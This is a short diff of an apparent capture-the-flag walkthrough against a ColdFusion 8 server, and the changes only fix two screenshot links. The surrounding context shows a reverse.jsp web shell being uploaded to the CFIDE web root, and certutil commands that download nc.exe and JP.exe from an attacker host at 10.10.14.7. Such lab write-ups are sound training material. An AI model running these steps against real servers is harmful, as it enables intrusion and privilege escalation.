@@ -268,7 +268,7 @@ We configure a scheduled task to upload it to:
 C:\ColdFusion8\wwwroot\CFIDE\reverse.jsp
 ```
 
-![Task creation](screenshots/web_creating_a_task.png)  
+![Task creation](screenshots/web_executing_task.png)  
 
 Serve the file with Python:
 
@@ -318,7 +318,7 @@ certutil.exe -f -urlcache -split http://10.10.14.7:80/nc.exe
 certutil.exe -f -urlcache -split http://10.10.14.7:80/JP.exe
 ```
 
-![Uploading nc & JP](screenshots/uploading_nc_and_JP.png)  
+![Uploading nc & JP](screenshots/uploading_nc_%26_JP.png)  
 
 Execution:
 
